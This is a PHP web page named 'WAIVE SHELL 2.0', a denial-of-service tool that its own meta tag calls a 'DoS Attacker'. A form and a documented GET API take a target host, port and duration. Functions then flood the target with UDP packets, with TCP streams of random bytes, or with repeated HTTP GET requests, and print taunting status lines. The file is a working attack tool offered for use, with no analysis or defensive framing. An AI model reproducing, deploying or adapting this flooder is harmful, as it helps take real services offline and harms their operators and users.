<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="WaiveShell2.0" content="DoS Attacker in PHP">
    <meta name="author" content="waived">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAIVE SHELL 2.0</title>
    <style>
        body {
            font-family: monospace;
            background-color: black;
            color: skyblue;
        }        
        footer {
            background-color: black;
            color: skyblue;
            padding: 10px;
            text-align: center;
            position: fixed;
            bottom: 0;
            width: 100%;
        }
        input:focus {
            outline: none;
        }
        input {
            background-color: blue;
            color: skyblue;
            border: 1px solid lightblue;
            padding: 5px;
        }
    </style>
</head>
<body>
    <center>
    <h1 style="font-size: 32px;">WAIVE SHELL 2.0</h1>
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="GET">
        <label for="type"><b>TYPE</b></label><br>
        <select name="type" id="type">
            <option value="udp">UDP</option>
            <option value="tcp">TCP</option>
            <option value="http">HTTP</option>
        </select><br><br>
        <label for="host"><b>HOST</b></label><br>
        <input type="text" name="host" id="host" required placeholder="1.1.1.1/www..."><br><br>
        <label for="port"><b>PORT</b></label><br>
        <input type="number" name="port" id="port" required placeholder="80"><br><br>
        <label for="time"><b>SECONDS</b></label><br>
        <input type="number" name="time" id="time" required placeholder="300"><br><br>
        <button type="submit">Launch</button>
    </form><br>
    <?php
    function _udp($ip, $port, $time) {
        $start_time = microtime(true);
        while ((microtime(true) - $start_time) < $time) {
            try {
                $data = random_bytes(mt_rand(1000, 1200));
                $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
                socket_sendto($socket, $data, strlen($data), 0, $ip, $port);
                socket_close($socket);
            } catch (Exception $e) {
                // echo "An error occurred: " . $e->getMessage();
            }
        }
        usleep(500000);
    }

    function _tcp($ip, $port, $time) {
        $start_time = microtime(true);
        while ((microtime(true) - $start_time) < $time) {
            try {
                $data = random_bytes(mt_rand(1000, 1200));
                $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                socket_connect($socket, $ip, $port);
                socket_write($socket, $data, strlen($data));
                // reuse to prevent TIME_WAIT local-socket exhaustion
                while ((microtime(true) - $start_time) < $time) {
                    // generate new data buffer
                    $data = random_bytes(mt_rand(1000, 1200));
                    socket_write($socket, $data, strlen($data));
                }
                socket_close($socket);
            } catch (Exception $e) {
                // echo "An error occurred: " . $e->getMessage();
            }
        }
        usleep(500000);
    }

    function _http($ip, $host, $port, $time) {
        $start_time = microtime(true);
        $data = "GET / HTTP/1.1\r\nHost:" . $host . "\r\nUser-Agent: Mozilla/5.0\r\nConnection: Keep-Alive\r\nKeep-Alive: timeout=5, max=1000\r\n\r\n";
        while ((microtime(true) - $start_time) < $time) {
            try {
                $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                socket_connect($socket, $ip, $port);
                socket_write($socket, $data, strlen($data));
                // reuse to prevent TIME_WAIT local-socket exhaustion
                while ((microtime(true) - $start_time) < $time) {
                    socket_write($socket, $data, strlen($data));
                }
                socket_close($socket);
            } catch (Exception $e) {
                // echo "An error occurred: " . $e->getMessage();
            }
        }
        usleep(500000);
    }

    // API / input handling
    if (isset($_GET['type']) && isset($_GET['host']) && isset($_GET['port']) && isset($_GET['time'])) {
        // Retrieve parameters
        $type = $_GET['type'];
        $host = $_GET['host'];
        $port = $_GET['port'];
        $time = $_GET['time'];
        
        $ip = gethostbyname($host);
        
        if (strtolower($type) === 'udp') {
            echo "FRYING " . $ip . ":" . $port . " VIA UDP FOR " . $time . " SECONDS";
            _udp($ip, $port, $time);
        } elseif (strtolower($type) === 'tcp') {
            echo "DISINTEGRATING " . $ip . ":" . $port . " VIA TCP FOR " . $time . " SECONDS";
            _tcp($ip, $port, $time);
        } elseif (strtolower($type) === 'http') {
            echo "VAPORIZING " . $host . " VIA HTTP FOR " . $time . " SECONDS";
            _http($ip, $host, $port, $time);
        } else {
            // idk bruh
        }
    } else {
        // display nothing
    }
    ?>
</center>

<footer>
    API format:  <b>waiveshell.php?type=[udp/tcp/http]&host=[ip/domain]&port=[1-65535]&time=[seconds]</b>
</footer>
</body>
</html>
